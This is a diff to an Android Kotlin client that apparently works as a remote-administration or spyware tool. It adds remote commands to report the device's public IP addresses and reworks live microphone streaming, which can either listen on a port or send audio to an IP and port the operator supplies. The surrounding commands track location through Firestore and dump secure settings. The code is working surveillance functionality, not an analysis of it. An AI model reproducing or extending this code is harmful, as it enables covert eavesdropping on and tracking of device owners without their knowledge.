@@ -131,6 +131,7 @@ import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import org.json.JSONObject
 import java.io.BufferedReader
 import java.io.BufferedWriter
@@ -368,20 +369,48 @@ fun openApp(context: Context, packageName: String?) {
     context.startActivity(i)
 }
 
-fun getForegroundApp(context: Context): String? {
-    val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
-    val time = System.currentTimeMillis()
+suspend fun getPublicIPv6(): String? {
+    return withContext(Dispatchers.IO) {
+        try {
+            // ipify's IPv6 endpoint returns a JSON object, e.g. {"ip":"2a00:1450:400f:80d::200e"}
+            val url = URL("https://api6.ipify.org?format=json")
+            val connection = url.openConnection() as HttpURLConnection
+            connection.apply {
+                setRequestProperty("User-Agent", "Mozilla/5.0")
+                connectTimeout = 5000
+                readTimeout = 5000
+            }
+            connection.inputStream.bufferedReader().use { reader ->
+                val response = reader.readText()
+                JSONObject(response).getString("ip")
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+            "Operation failed - ${e.localizedMessage}"
+        }
+    }
+}
 
-    val usageStatsList = usageStatsManager.queryUsageStats(
-        UsageStatsManager.INTERVAL_DAILY,
-        time - 10 * 1000,  // Check for last 10 seconds
-        time
-    )
-
-    if (usageStatsList.isNullOrEmpty()) return null
-
-    val recentApp = usageStatsList.maxByOrNull { it.lastTimeUsed }
-    return recentApp?.packageName
+suspend fun getPublicIPv4(): String? {
+    return withContext(Dispatchers.IO) {
+        try {
+            // ipify's IPv6 endpoint returns a JSON object, e.g. {"ip":"2a00:1450:400f:80d::200e"}
+            val url = URL("https://api.ipify.org?format=json")
+            val connection = url.openConnection() as HttpURLConnection
+            connection.apply {
+                setRequestProperty("User-Agent", "Mozilla/5.0")
+                connectTimeout = 5000
+                readTimeout = 5000
+            }
+            connection.inputStream.bufferedReader().use { reader ->
+                val response = reader.readText()
+                JSONObject(response).getString("ip")
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+            "Operation failed - ${e.localizedMessage}"
+        }
+    }
 }
 
 fun getAllSecureSettingsAsJson(context: Context): JSONObject {
@@ -1341,6 +1370,26 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
             "SET_PHONE_NO_TO_USE: Operation completed successfully",
             messageID, serverID
         )
+    } else if (command == "GET_PUBLIC_IPV6_ADDRESS") {
+        CoroutineScope(Dispatchers.IO).launch {
+            val publicIPv6 = getPublicIPv6()
+            sendMessage(
+                context,
+                false,
+                "GET_PUBLIC_IPV6_ADDRESS: $publicIPv6",
+                messageID, serverID
+            )
+        }
+    } else if (command == "GET_PUBLIC_IPV4_ADDRESS") {
+        CoroutineScope(Dispatchers.IO).launch {
+            val publicIPv4 = getPublicIPv4()
+            sendMessage(
+                context,
+                false,
+                "GET_PUBLIC_IPV4_ADDRESS: $publicIPv4",
+                messageID, serverID
+            )
+        }
     } else if (command == "START_SAVING_CURRENT_LOCATION_IN_FIRESTORE") {
         saveCurrentLocationInFirestore = true
         sendMessage(
@@ -6702,11 +6751,58 @@ class ClientService: Service() {
                                                     messageID, serverID
                                                 )
                                             }
-                                        } else if (command.startsWith("START_STREAMING_MIC ")) {
+                                        } else if (command.startsWith("START_MIC_STREAMING_SERVER ")) {
                                             try {
-                                                val ip = command.removePrefix("START_STREAMING_MIC ").split(" ")[0]
-                                                val port = command.removePrefix("START_STREAMING_MIC ").split(" ")[1]
-                                                val audioFormatStr = command.removePrefix("START_STREAMING_MIC ").split(" ")[2]
+                                                val port = command.removePrefix("START_MIC_STREAMING_SERVER ").split(" ")[0]
+                                                val audioFormatStr = command.removePrefix("START_MIC_STREAMING_SERVER ").split(" ")[1]
+                                                val audioFormat: Int = when (audioFormatStr) {
+                                                    "ENCODING_PCM_8BIT" -> AudioFormat.ENCODING_PCM_8BIT
+                                                    "ENCODING_PCM_16BIT" -> AudioFormat.ENCODING_PCM_16BIT
+                                                    "ENCODING_PCM_24BIT_PACKED" -> AudioFormat.ENCODING_PCM_24BIT_PACKED
+                                                    "ENCODING_PCM_32BIT" -> AudioFormat.ENCODING_PCM_32BIT
+                                                    "ENCODING_PCM_FLOAT" -> AudioFormat.ENCODING_PCM_FLOAT
+                                                    else -> -1
+                                                }
+                                                if (audioFormat != -1) {
+                                                    startService(
+                                                        Intent(
+                                                            applicationContext,
+                                                            MicStreamingService::class.java
+                                                        ).apply {
+                                                            putExtra("ServerPort", port.toInt())
+                                                            putExtra("MessageID", messageID)
+                                                            putExtra("ServerID", serverID)
+                                                            putExtra("AudioFormat", audioFormat)
+                                                            putExtra("StartServer", true)
+                                                            putExtra("Command", "START_MIC_STREAMING_SERVER")
+                                                        }
+                                                    )
+                                                    Log.d(
+                                                        "AudioStreamingService",
+                                                        "startService() called"
+                                                    )
+                                                } else {
+                                                    sendMessage(
+                                                        this,
+                                                        false,
+                                                        "START_MIC_STREAMING_SERVER: Operation failed - unknown audio format",
+                                                        messageID, serverID
+                                                    )
+                                                }
+                                            } catch (ex: Exception) {
+                                                ex.printStackTrace()
+                                                sendMessage(
+                                                    this,
+                                                    false,
+                                                    "START_MIC_STREAMING_SERVER: Operation failed - ${ex.localizedMessage}",
+                                                    messageID, serverID
+                                                )
+                                            }
+                                        } else if (command.startsWith("START_MIC_STREAMING_CLIENT ")) {
+                                            try {
+                                                val ip = command.removePrefix("START_MIC_STREAMING_CLIENT ").split(" ")[0]
+                                                val port = command.removePrefix("START_MIC_STREAMING_CLIENT ").split(" ")[1]
+                                                val audioFormatStr = command.removePrefix("START_MIC_STREAMING_CLIENT ").split(" ")[2]
                                                 val audioFormat: Int = when (audioFormatStr) {
                                                     "ENCODING_PCM_8BIT" -> AudioFormat.ENCODING_PCM_8BIT
                                                     "ENCODING_PCM_16BIT" -> AudioFormat.ENCODING_PCM_16BIT
@@ -6726,6 +6822,8 @@ class ClientService: Service() {
                                                             putExtra("MessageID", messageID)
                                                             putExtra("ServerID", serverID)
                                                             putExtra("AudioFormat", audioFormat)
+                                                            putExtra("StartServer", false)
+                                                            putExtra("Command", "START_MIC_STREAMING_CLIENT")
                                                         }
                                                     )
                                                     Log.d(
@@ -6736,7 +6834,7 @@ class ClientService: Service() {
                                                     sendMessage(
                                                         this,
                                                         false,
-                                                        "START_STREAMING_MIC: Operation failed - unknown audio format",
+                                                        "START_MIC_STREAMING_CLIENT: Operation failed - unknown audio format",
                                                         messageID, serverID
                                                     )
                                                 }
@@ -6745,16 +6843,16 @@ class ClientService: Service() {
                                                 sendMessage(
                                                     this,
                                                     false,
-                                                    "START_STREAMING_MIC: Operation failed - ${ex.localizedMessage}",
+                                                    "START_MIC_STREAMING_CLIENT: Operation failed - ${ex.localizedMessage}",
                                                     messageID, serverID
                                                 )
                                             }
-                                        } else if (command == "STOP_STREAMING_MIC") {
+                                        } else if (command == "STOP_MIC_STREAMING") {
                                             sendBroadcast(Intent(MicStreamingService.ACTION_STOP_MIC_STREAMING_SERVICE))
                                             sendMessage(
                                                 this,
                                                 false,
-                                                "STOP_STREAMING_MIC: Operation completed successfully",
+                                                "STOP_MIC_STREAMING: Operation completed successfully",
                                                 messageID, serverID
                                             )
                                         } else if (command == "REGISTER_CALLBACK_FOR_LOCATION_UPDATES") {
@@ -6873,25 +6971,6 @@ class ClientService: Service() {
                 handler.postDelayed(this, 2000)
             }
         }, 2000)
-    }
-
-    private fun startTetheringServerSocket() {
-        serverJob = CoroutineScope(Dispatchers.IO).launch {
-            try {
-                // Open server socket on port 8888.
-                serverSocket = ServerSocket(8888)
-                Log.d("ClientService", "Server socket listening on port 8888")
-                while (isWifiP2pEnabled) {
-                    // Accept incoming client connection (blocking call).
-                    val clientSocket = serverSocket?.accept() ?: break
-                    Log.d("ClientService", "Accepted connection from ${clientSocket.inetAddress.hostAddress}")
-                    // Launch a new coroutine to handle each connection.
-                    launch { handleClient(clientSocket) }
-                }
-            } catch (e: IOException) {
-                Log.e("ClientService", "Error with server socket", e)
-            }
-        }
     }
 
     private suspend fun handleClient(socket: Socket) {
